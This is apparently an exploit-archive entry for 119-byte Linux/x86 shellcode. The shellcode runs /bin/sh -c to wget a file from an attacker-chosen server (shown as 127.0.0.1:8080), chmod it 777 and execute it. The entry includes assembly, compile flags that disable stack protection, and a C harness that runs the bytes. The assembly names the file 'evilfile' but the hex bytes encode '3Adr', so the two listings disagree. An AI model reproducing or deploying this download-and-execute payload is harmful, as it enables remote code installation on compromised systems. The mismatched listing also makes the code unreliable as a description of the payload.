/*
# Exploit Title: Linux/x86 wget chmod execute over execve /bin/sh -c shellcode (119 bytes)
# Google Dork: None
# Date: 08.12.2018
# Exploit Author: strider
# Vendor Homepage: None
# Software Link: None
# Tested on: Debian 9 Stretch i386/ Kali Linux i386
# CVE : None
# Shellcode Length: 119
------------------------------[Description]---------------------------------

This shellcode use execve syscall to run /bin/sh -c which executes wget to download a file from a your server.
After download it executes chmod 777 to your downloaded file and execute your file

-----------------------------[Shellcode Dump]---------------------------------

section .text

global _start

_start:
	xor eax, eax
	push eax
	jmp short _execline

_exec:
	pop ecx
	mov edi, ecx
	xor ecx, ecx
	push eax
	push 0x68732f6e
	push 0x69622f2f
	mov ebx, esp

	push eax
	push word 0x632d
	mov esi , esp


	push eax
	push edi
	push esi
	push ebx

	mov ecx, esp
	mov al, 11
	int 0x80


_execline:
	call _exec
	line db "/usr/bin/wget http://127.0.0.1:8080/evilfile && /bin/chmod 777 evilfile && ./evilfile", 0x0a


 -----------------------------[Compile]---------------------------------------------
 gcc -m32 -fno-stack-protector -z execstack -o tester tester.c

 -----------------------------[C-Code]-----------------------------
*/

 #include <stdio.h>
 #include <string.h>

 unsigned char shellcode[] = "\x31\xc0\x50\xeb\x23\x59\x89\xcf\x31\xc9\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x66\x68\x2d\x63\x89\xe6\x50\x57\x56\x53\x89\xe1\xb0\x0b\xcd\x80\xe8\xd8\xff\xff\xff\x2f\x75\x73\x72\x2f\x62\x69\x6e\x2f\x77\x67\x65\x74\x20\x68\x74\x74\x70\x3a\x2f\x2f\x31\x32\x37\x2e\x30\x2e\x30\x2e\x31\x3a\x38\x30\x38\x30\x2f\x33\x41\x64\x72\x20\x26\x26\x20\x2f\x62\x69\x6e\x2f\x63\x68\x6d\x6f\x64\x20\x37\x37\x37\x20\x33\x41\x64\x72\x20\x26\x26\x20\x2e\x2f\x33\x41\x64\x72\x0a";

 void main()
 {
     printf("Shellcode Length:  %d\n", strlen(shellcode));

     int (*ret)() = (int(*)())shellcode;
     ret();
 }